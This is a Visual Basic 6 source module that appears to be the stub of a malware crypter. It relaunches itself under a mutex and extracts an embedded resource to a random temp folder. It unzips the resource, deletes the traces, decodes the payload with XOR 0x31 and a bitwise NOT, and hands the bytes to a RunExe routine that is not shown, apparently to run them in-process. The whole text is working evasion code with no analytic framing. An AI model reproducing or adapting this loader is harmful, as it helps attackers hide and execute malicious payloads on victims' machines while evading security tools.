Attribute VB_Name = "mMod"
Private Declare Function CreateMutex Lib "kernel32" Alias "CreateMutexA" ( _
ByRef lpMutexAttributes As Any, _
ByVal bInitialOwner As Long, _
ByVal lpName As String) As Long


Private Declare Function ReleaseMutex Lib "kernel32" ( _
ByVal hMutex As Long) As Long


Private Declare Function OpenMutex Lib "kernel32" Alias "OpenMutexA" ( _
ByVal dwDesiredAccess As Long, _
ByVal bInheritHandle As Long, _
ByVal lpName As String) As Long

Private Declare Function CloseHandle Lib "kernel32" ( _
ByVal hObject As Long) As Long

Private Const MUTEX_ALL_ACCESS = &H1F0001


Private Sub Main()
Dim lngMutex As Long
Dim CustomCmd As String

CustomCmd = RandomString(7)
lngMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, Command)
If lngMutex <> 0 Then
    Call MainRun
Else
    lngMutex = CreateMutex(ByVal 0, 0, Command)
    Shell App.Path & "\" & App.EXEName & ".exe" & " " & CustomCmd
End If

End Sub

Function RandomString(cb As Integer) As String
    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next

End Function

Private Sub MainRun()
Dim File() As Byte
Dim i As Long
Dim ExPath As String
    ExPath = Environ("TMP") & "\" & RandomString(5)
    
    File = LoadResData(102, "CUSTOM")
    MkDir ExPath & "\"
    
    Open ExPath & "\Data.zip" For Binary Access Write As #1
        Put #1, , File
    Close #1
    
    If ShellUnzip(ExPath & "\Data.zip", ExPath & "\") = True Then
        Open ExPath & "\Data.bin" For Binary As #1
        ReDim File(LOF(1))
        Get #1, , File
    Close #1
    Else
        End
    End If
    
    Kill ExPath & "\Data.zip"
    Kill ExPath & "\Data.bin"
    RmDir (ExPath & "\")
    
    For i = 0 To UBound(File)
        File(i) = File(i) Xor &H31
        File(i) = Not File(i)
    Next
        
    Call RunExe(App.Path & "\" & App.EXEName & ".exe", File)
End Sub
